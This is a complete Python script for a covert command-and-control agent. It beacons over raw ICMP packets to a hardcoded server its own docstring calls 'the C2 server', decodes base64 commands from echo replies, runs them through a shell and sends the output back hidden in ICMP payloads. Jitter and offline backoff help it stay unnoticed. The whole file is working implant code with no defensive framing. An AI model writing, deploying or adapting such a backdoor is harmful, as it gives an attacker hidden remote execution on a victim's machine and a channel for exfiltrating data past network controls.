import socket
import struct
import os
import subprocess
import time
import random
import base64

SERVER_IP = "100.65.6.160"  # Change if needed
RECV_TIMEOUT = 5  # seconds
MAX_RETRIES = 3
MIN_BEACON = 10    # minimum beacon interval in seconds
MAX_BEACON = 60    # maximum beacon interval in seconds
LONG_OFFLINE_SLEEP = 600  # 10 min backoff when network down

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def send_icmp(sock, payload, pid, seq, icmp_type):
    pkt = struct.pack("!BBHHH", icmp_type, 0, 0, pid, seq) + payload
    chksum = checksum(pkt)
    pkt = struct.pack("!BBHHH", icmp_type, 0, chksum, pid, seq) + payload
    sock.sendto(pkt, (SERVER_IP, 0))

def network_is_up():
    """Simple check: can we ping the C2 server?"""
    try:
        # Note: subprocess may throw if ping fails
        subprocess.check_output(
            ["ping", "-c", "1", "-W", "1", SERVER_IP],
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        return False

# Create raw ICMP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
sock.settimeout(RECV_TIMEOUT)

pid = os.getpid() & 0xFFFF
seq = 1

print("[+] ICMP Agent started")

while True:
    # Network-aware beaconing
    if not network_is_up():
        print("[!] Network unreachable, sleeping...")
        time.sleep(LONG_OFFLINE_SLEEP)
        continue  # retry after sleep

    # Per-beacon jitter
    beacon_interval = random.randint(MIN_BEACON, MAX_BEACON)

    # Drain any stale packets
    sock.setblocking(0)
    try:
        while True:
            sock.recv(2048)
    except:
        pass
    sock.setblocking(1)
    sock.settimeout(RECV_TIMEOUT)

    # Send beacon
    beacon_seq = seq
    send_icmp(sock, f"BEACON pid={pid}".encode(), pid, seq, 8)
    seq += 1

    retries = 0
    command = None

    # Wait for command with retry logic
    while retries < MAX_RETRIES:
        try:
            packet, addr = sock.recvfrom(2048)
            if addr[0] != SERVER_IP:
                continue

            icmp_type, _, _, r_pid, r_seq = struct.unpack("!BBHHH", packet[20:28])
            payload = packet[28:].decode(errors="ignore").strip()

            if icmp_type == 0 and r_pid == pid and r_seq == beacon_seq and payload.startswith("CMD:"):
                encoded_cmd = payload[4:]
                command = base64.b64decode(encoded_cmd).decode(errors="ignore")
                break
        except socket.timeout:
            retries += 1
            print(f"[!] No response from server (retry {retries}/{MAX_RETRIES})")

    # Survive long outages — if no command, just sleep with jitter
    if not command:
        print(f"[i] No command received, next beacon in {beacon_interval}s")
        time.sleep(beacon_interval)
        continue

    # Execute command in a new shell if not NOP
    if command != "NOP":
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, timeout=5
            )
        except Exception as e:
            output = str(e).encode()

        encoded_out = base64.b64encode(output)
        send_icmp(sock, b"OUT:" + encoded_out, pid, seq, 8)
        seq += 1

    time.sleep(beacon_interval)
